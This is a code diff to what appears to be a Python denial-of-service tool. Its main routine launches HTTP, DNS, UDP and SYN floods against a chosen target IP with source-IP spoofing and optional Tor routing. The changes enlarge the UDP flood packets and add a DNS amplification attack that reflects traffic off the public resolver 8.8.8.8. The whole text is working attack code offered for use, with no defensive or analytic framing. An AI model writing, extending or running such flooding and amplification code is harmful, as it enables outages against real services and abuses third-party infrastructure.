@@ -74,6 +74,7 @@ class Main:
         target_ip, target_port, thread_count = self.get_attack_parameters()
         if target_ip and target_port and thread_count:
             extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info", "world", "click"]
+             
             dns_flood = DnsFlood(target_ip, target_port, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=True, spoof_ip=True)
             self.attack_manager.run_attack(dns_flood, thread_count)
 
@@ -116,10 +117,10 @@ class Main:
         http_flood = HttpFlood(target_ip, 80, self.use_tor)
         extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info"]
         dns_flood = DnsFlood(target_ip, 53, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=True, spoof_ip=True)
-        udp_flood = UdpFlood(target_ip, 53, packet_size=1024)
+        udp_flood = UdpFlood(target_ip, 53, packet_size=6024)
         syn_flood = SynFlood(target_ip, 53, 10000, 0.1)
-
-        attacks = [http_flood, dns_flood, udp_flood, syn_flood]
+        dns_amplification = DnsAmplification(target_ip, '8.8.8.8', 53, thread_count, 6024)
+        attacks = [http_flood, dns_flood, udp_flood, syn_flood, dns_amplification]
         self.attack_manager.run_all_attacks(attacks, thread_count)
 
     def shutdown_all_attacks(self):
